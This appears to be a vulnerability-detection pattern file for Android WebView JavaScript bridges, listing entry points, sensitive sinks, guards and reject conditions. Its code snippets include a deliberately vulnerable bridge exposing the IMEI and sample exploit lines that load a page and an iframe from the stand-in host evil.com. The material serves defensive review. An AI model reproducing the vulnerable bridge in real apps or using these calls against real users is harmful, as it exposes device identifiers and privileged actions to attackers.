# Pattern: WebView JS Bridge

## Match

`WebView.addJavascriptInterface(Object, name)` exposes a Java object to JS in the WebView. Pre-API 17 every public method is reachable; API 17+ requires `@JavascriptInterface`. Non-obvious: the bridge is NOT partitioned per-origin — any `<iframe>` (including attacker-controlled) can call `window.<name>.foo()`. Cross-domain: callable from any page the WebView loads, including attacker `loadUrl(attackerUrl)` reached via `shouldOverrideUrlLoading` or IntentScheme redirect.

## Analyze

- entry: `WebView.addJavascriptInterface`, `evaluateJavascript`, `loadUrl("javascript:...")`, `WebMessage` (Android M+), `postWebMessage`, content script
- control: `name` of the bridge, called method name, argument type, JS context source, iframe/script content, URL loaded in the WebView, `WebSettings.setAllowFileAccess*` family
- sink: `Settings` (`Settings.System.putString` for `ADB_ENABLED` etc.), `TelephonyManager` (`IMEI`, `IMSI`, `subscriberId`, `line1Number`, `networkOperator*`), `SmsManager`, `getRuntime().exec`, file I/O (`FileOutputStream` / `FileInputStream`), `PackageManager` (install/launch), `ContentResolver.query` / `openFile` to protected providers, `ClipboardManager`, `AccountManager`, callback to attacker JS
- guard: `@JavascriptInterface` on every exposed method; reject any WebView that has `setAllowFileAccess(true)` AND loads remote URLs; do not let a JS bridge reach `Settings.Secure.ADB_ENABLED`; never use `addJavascriptInterface` when the WebView loads cross-origin/untrusted content
- impact: read protected identifiers (IMEI/IMSI/SIM/Location), toggle `ADB_ENABLED`, write app-accessible files, install/launch packages, exfiltrate to attacker domain

## Reject

Reject when the bridge object has no privileged methods, the WebView loads only trusted URLs and the bridge is not exposed to cross-origin JS, or the methods lack `@JavascriptInterface`.

## Codes

```java
// bridge exposes private identifier — reachable from any JS in the WebView (cross-origin and iframe-reachable)
@JavascriptInterface
public String getImei() { return ((TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE)).getDeviceId(); }
webView.addJavascriptInterface(new JSInterface(this), "NativeBridge");
```

```java
// attacker loads the bridge from an attacker-controlled URL
webView.loadUrl("http://evil.com/exploit.html");
```

```javascript
// exploit from inside the loaded page — bridges are reachable from any origin/iframe
window.NativeBridge.getImei();
```

```javascript
// iframe content reaches the same bridge (no per-origin partitioning)
<iframe src="http://evil.com/exploit.html" />
```
